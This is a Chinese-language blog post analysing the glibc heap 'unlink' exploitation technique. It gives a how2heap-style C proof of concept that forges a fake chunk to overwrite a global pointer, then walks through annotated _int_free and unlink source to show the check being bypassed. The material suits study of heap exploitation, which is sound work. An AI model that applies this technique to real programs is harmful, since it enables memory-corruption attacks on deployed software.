---
title: unlink_attack源码分析
date: 2021-08-24 18:34:47
tags:
    - pwn
    - 源码分析
    - how2heap
    - unlink
categories:
    - pwn
---
## unlink attack

这是unlink的攻击过程
```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <assert.h>
uint64_t var1;	

int main()
{
	uint64_t *p0 = malloc(0x40);
	uint64_t *p1 = malloc(0x100);
	uint64_t *p2 = malloc(0x90);
	malloc(0x20);
	var1 = (unsigned long)p1;
	
	p1[0]  = 0;  p1[1] = p1[-1]-0x10;
	p1[2]  = (unsigned long)(&var1-3);
	p1[3]  = (unsigned long)(&var1-2);
	p2[-2] = p1[-1]-0x10-1;
	p2[-1] = 0xa0;//把pre_inuse置0
	free(p2);    //向后合并

	assert(var1 != (unsigned long)p1);
	assert(var1 == (unsigned long)(&var1-3));


	return 0;
}
```
这是构造方式似乎损害很小,unlink并不清楚victim在哪个循环链表中，而且victim的循环链表是伪造出来的，unlink破坏后并不影响关键部分。
```c
_int_free (mstate av, mchunkptr p, int have_lock)
{
    ... //一大堆检查
    /* consolidate backward */
    if (!prev_inuse(p)) {
      prevsize = p->prev_size;
      size += prevsize;
      p = chunk_at_offset(p, -((long) prevsize));
      unlink(av, p, bck, fwd);
    }
    ...
```
```c
//这实际上是个宏
unlink(AV, P, BK, FD)
{ 

    if (__builtin_expect (chunksize(P) != (next_chunk(P))->prev_size, 0))      
      malloc_printerr (check_action, "corrupted size vs. prev_size", P, AV);  
    FD = P->fd;								      
    BK = P->bk;	
//P将要被脱出的chunk
//-------------check------------------------------------------
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))
//-------------check------------------							      
      malloc_printerr (check_action, "corrupted double-linked list", P, AV);  
    else {	
//------------exploit-----------------------------------------
            FD->bk = BK;							      
            BK->fd = FD;//最终被写入的							      
//-------------exploit----------------------------------------
            if (!in_smallbin_range (P->size)				      
                && __builtin_expect (P->fd_nextsize != NULL, 0)) 
            {
                ...
            }								      
      }									      
}
```